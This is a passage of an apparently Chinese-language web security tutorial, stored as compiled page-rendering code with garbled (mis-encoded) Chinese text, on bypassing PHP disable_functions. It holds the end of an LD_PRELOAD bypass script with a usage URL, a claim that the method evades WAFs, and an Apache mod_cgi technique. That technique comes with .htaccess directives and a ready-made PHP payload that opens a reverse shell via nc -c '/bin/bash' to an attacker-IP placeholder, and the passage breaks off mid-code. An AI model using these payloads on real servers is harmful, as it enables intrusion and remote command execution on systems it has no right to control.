double-quoted-string string"}},[s._v('" > "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('" 2>&1"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<p> <b>cmdline</b>: "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$evil_cmdline")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"</p>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("putenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"EVIL_CMDLINE="')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$evil_cmdline")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$so_path")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"sopath"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("putenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"LD_PRELOAD="')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$so_path")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mail")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<p> <b>output</b>: <br />"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nl2br")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_get_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"</p>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unlink")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("p",[s._v("å°†ç¼–è¯‘æˆçš„"),a("strong",[s._v("åŠ¨æ€é“¾æ¥åº“")]),s._v("å’Œ"),a("strong",[s._v("phpæ–‡ä»¶")]),s._v("ä¸Šä¼ åˆ°ç›®æ ‡ç½‘ç«™æ ¹ç›®å½•ã€‚")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#ç”¨æ³•å¦‚ä¸‹")]),s._v("\nhttp://xx.com/bypass_disablefunc.php?cmd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ls"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("outpath")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/tmp/ss"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("sopath")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/www/html/bypass_disablefunc_x64.so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("blockquote",[a("p",[s._v("PHP æ”¯æŒputenv()ã€mail() å³å¯ï¼Œç”šè‡³æ— éœ€å®‰è£… sendmailã€‚ ("),a("strong",[s._v("æ­¤æ–¹æ³•è¿˜å¯ç”¨äºè¿‡WAF")]),s._v(")")])]),s._v(" "),a("h3",{attrs:{id:"fastcgi-php-fpm"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#fastcgi-php-fpm"}},[s._v("#")]),s._v(" "),a("strong",[s._v("Fastcgi/PHP-FPM")])]),s._v(" "),a("p",[s._v("Fastcgi æ˜¯ä¸€ç§é€šè®¯åè®®ï¼Œç”¨äºWebæœåŠ¡å™¨ä¸åç«¯è¯­è¨€çš„æ•°æ®äº¤æ¢ï¼›")]),s._v(" "),a("p",[s._v("PHP-FPM åˆ™æ˜¯phpç¯å¢ƒä¸­å¯¹Fastcgiåè®®çš„ç®¡ç†ç¨‹åºå®ç°")]),s._v(" "),a("p",[s._v("Nginxä¸ºfastcgi æä¾›äº† fastcgi_param æ¥ä¸»è¦å¤„ç†æ˜ å°„å…³ç³»ï¼Œå°† Nginx ä¸­çš„å˜é‡ç¿»è¯‘æˆ PHP èƒ½å¤Ÿç†è§£çš„å˜é‡")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/AntSwordProject/ant_php_extension",target:"_blank",rel:"noopener noreferrer"}},[s._v("èšå‰‘æ‰©å±•"),a("OutboundLink")],1),s._v("ï¼Œç”¨ç›¸åº”ç‰ˆæœ¬phpç¼–è¯‘å³å¯")]),s._v(" "),a("h3",{attrs:{id:"apache-mod-cgi"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#apache-mod-cgi"}},[s._v("#")]),s._v(" "),a("strong",[s._v("Apache Mod CGI")])]),s._v(" "),a("p",[s._v("Mod CGIå°±æ˜¯æŠŠPHPåšä¸ºAPACHEä¸€ä¸ªå†…ç½®æ¨¡å—ï¼Œ")]),s._v(" "),a("p",[s._v("è®©apache httpæœåŠ¡å™¨æœ¬èº«èƒ½å¤Ÿæ”¯æŒPHPè¯­è¨€ï¼Œä¸éœ€è¦æ¯ä¸€ä¸ªè¯·æ±‚éƒ½é€šè¿‡å¯åŠ¨PHPè§£é‡Šå™¨æ¥è§£é‡ŠPHP")]),s._v(" "),a("p",[s._v("å®ƒå¯ä»¥å°†cgi-scriptæ–‡ä»¶æˆ–è€…ç”¨æˆ·è‡ªå®šä¹‰æ ‡è¯†å¤´ä¸ºcgi-scriptçš„æ–‡ä»¶é€šè¿‡æœåŠ¡å™¨è¿è¡Œ")]),s._v(" "),a("p",[s._v("åœ¨phpinfoçœ‹åˆ°"),a("code",[s._v("Server API -> CGI/FastCGI")]),s._v("ï¼Œå°±å¯ä»¥ç¡®å®šæ˜¯ä»¥cgiæ¨¡å¼è¿è¡Œçš„äº†ã€‚")]),s._v(" "),a("p",[a("strong",[s._v("è¦æ±‚")])]),s._v(" "),a("blockquote",[a("ol",[a("li",[s._v("apacheä¸”è¿è¡Œmod_cgiæ¨¡å¼")]),s._v(" "),a("li",[s._v("webç›®å½•å¯å†™")]),s._v(" "),a("li",[s._v("å…è®¸.htaccessç”Ÿæ•ˆ")])])]),s._v(" "),a("p",[s._v("åœ¨.htaccess ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ŒæŒ‡å®š.dazzleä¸ºç»“å°¾çš„æ–‡ä»¶ä¸ºCGIè„šæœ¬ç¨‹åºå¹¶ä¸”å…è®¸æœ¬ç›®å½•æ‰§è¡Œï¼Œæˆ‘ä»¬åªè¦åŒæ—¶ä¸Šä¼ ä¸€ä¸ª.dazzleçš„shellå°±å¯ä»¥äº†ã€‚")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Options +ExecCGI\nAddHandler cgi-script .dizzle\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("ç°æˆpayload - ã€‹åå¼¹shellï¼š")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v("\"nc -c '/bin/bash' æ”»å‡»è€…IP 6666\"")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//command to be executed")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"#!/bin/bash\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//using a shellscript")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"echo -ne \\"Content-Type: text/html\\\\n\\\\n\\"\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//header is needed, otherwise a 500 error is thrown when there is output")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")])]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//executing $cmd")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$text")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$condition")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$yes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$no")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//this surely can be shorter")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$text")])]),s._v(': "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$condition")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$yes")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$no")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br>\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'checked'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    @"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'.htaccess'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"\\nSetEnv HTACCESS on"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("FILE_APPEND")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//Append it to a .htaccess file to see whether .htaccess is allowed")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("header")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'Location: '")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_SERVER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'PHP_SELF'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'?checked=true'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//execute the script again to see if the htaccess test worked")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$modcgi")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("in_array")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'mod_cgi'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apache_get_modules")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// mod_cgi enabled?")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$writable")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("is_writable")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'.'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//current dir writable?")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$htaccess")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("empty")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_SERVER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'HTACCESS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//htaccess enabled?")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Mod-Cgi enabled"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$modcgi")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Yes"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"No"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Is writable"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$writable")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Yes"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"No"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"htaccess working"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$htaccess")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Yes"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"No"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$modcgi")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$writable")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$htaccess")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Error. All of the above must be true for the script to work!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//abort if not")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Backing up .htaccess"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("copy")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('".htaccess"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('".htaccess.bak"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Suceeded! Saved in .htaccess.bak"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//make a backup, cause you never know.")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Write .htaccess file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("'.htaccess'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Options +ExecCGI\\nAddHandler cgi-script .dizzle"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Succeeded!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Failed!"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//.dizzle is a nice extension")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"Write shell file"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token 